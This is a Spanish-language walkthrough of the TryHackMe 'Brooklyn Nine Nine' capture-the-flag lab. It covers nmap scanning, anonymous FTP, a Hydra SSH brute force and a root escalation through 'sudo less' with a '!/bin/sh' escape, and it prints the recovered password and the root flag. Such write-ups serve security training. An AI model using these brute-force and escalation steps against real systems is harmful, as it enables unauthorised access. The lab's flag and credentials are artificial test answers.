[Brooklyn_Nine_Nine](https://tryhackme.com/room/brooklynninenine)
# TryHackMe — Brooklyn Nine Nine

## 1. Fase de Reconocimiento

Comencé realizando un escaneo de los servicios:

```bash
nmap -sCV 10.65.183.243 --open
```

### Parámetros utilizados

- `-sC`: ejecuta los scripts básicos de enumeración de Nmap.
- `-sV`: identifica las versiones de los servicios.
- `--open`: muestra únicamente los puertos abiertos.

El escaneo mostró:

```text
21/tcp   open  ftp   vsftpd 3.0.3
22/tcp   open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http  Apache httpd 2.4.29
```

Además, Nmap indicó que FTP permitía acceso anónimo:

```text
ftp-anon: Anonymous FTP login allowed
-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt
```

## 2. Enumeración de FTP

Me conecté al servicio FTP:

```bash
ftp 10.65.183.243
```

Utilicé el usuario:

```text
anonymous
```

El servidor permitió el acceso:

```text
230 Login successful.
```

Listé los archivos disponibles:

```bash
ls -l
```

Encontré:

```text
-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt
```

Descargué el archivo:

```bash
get note_to_jake.txt
```

El comando `get` permite descargar un archivo desde el servidor FTP hacia mi máquina.

Después lo leí:

```bash
cat note_to_jake.txt
```

El contenido era:

```text
From Amy,
Jake please change your password. It is too weak and holt will be mad if
someone hacks into the nine nine
```

A partir de esta información identifiqué `jake` como un posible usuario y comprobé sus credenciales mediante SSH.

## 3. Fuerza Bruta contra SSH

Utilicé Hydra con `jake` como usuario y `rockyou.txt` como wordlist:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.65.183.243
```

### Parámetros utilizados

- `-l jake`: establece `jake` como usuario.
- `-P /usr/share/wordlists/rockyou.txt`: utiliza `rockyou.txt` como lista de contraseñas.
- `ssh://10.65.183.243`: especifica el servicio SSH y el objetivo.

Hydra encontró las siguientes credenciales:

```text
login: jake
password: 987654321
```

## 4. Acceso como Jake

Me conecté mediante SSH:

```bash
ssh jake@10.67.158.181
```

Después de introducir la contraseña obtenida, conseguí acceso como `jake`.

Revisé el contenido de mi directorio:

```bash
ls -l
```

Después enumeré los directorios de `/home`:

```bash
cd /home
ls
```

Encontré:

```text
amy
holt
jake
```

Revisé el directorio de `holt`:

```bash
cd holt
ls -l
```

Encontré:

```text
-rw------- 1 root root 110 May 18 2020 nano.save
-rw-rw-r-- 1 holt holt 33 May 17 2020 user.txt
```

Leí `user.txt`:

```bash
cat user.txt
```

Con esto obtuve la primera flag.

## 5. Enumeración de Privilegios

Después comprobé los permisos sudo del usuario `jake`:

```bash
sudo -l
```

El resultado mostró:

```text
User jake may run the following commands on brooklyn_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Esto indica que `jake` puede ejecutar `/usr/bin/less` como cualquier usuario mediante `sudo` sin proporcionar contraseña.

El binario permitido era:

```text
/usr/bin/less
```

## 6. Explotación de `sudo less`

Ejecuté `less` mediante `sudo`:

```bash
sudo less /etc/hosts
```

Una vez dentro de `less`, utilicé:

```text
!/bin/sh
```

El `!` permite ejecutar un comando desde `less`. Al ejecutar `/bin/sh`, obtuve una shell con los privilegios con los que se estaba ejecutando `less`.

## 7. Acceso como Root

Después de ejecutar:

```text
!/bin/sh
```

obtuve una shell privilegiada.

Comprobé el contenido de `/root`:

```bash
cd /root
ls -l
```

Encontré:

```text
-rw-r--r-- 1 root root 135 May 18 2020 root.txt
```

Finalmente, leí el archivo:

```bash
cat root.txt
```

El contenido mostró:

```text
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
Enjoy!!
```

## Cadena de ataque

```text
Nmap
  │
  ├── FTP Anonymous
  │      │
  │      └── note_to_jake.txt
  │                 │
  │                 └── Usuario: jake
  │
  └── SSH
         │
         └── Hydra
                │
                └── jake : 987654321
                           │
                           └── Acceso SSH
                                  │
                                  └── sudo -l
                                         │
                                         └── /usr/bin/less
                                                │
                                                └── sudo less
                                                       │
                                                       └── !/bin/sh
                                                              │
                                                              └── Root
                                                                     │
                                                                     └── root.txt
```
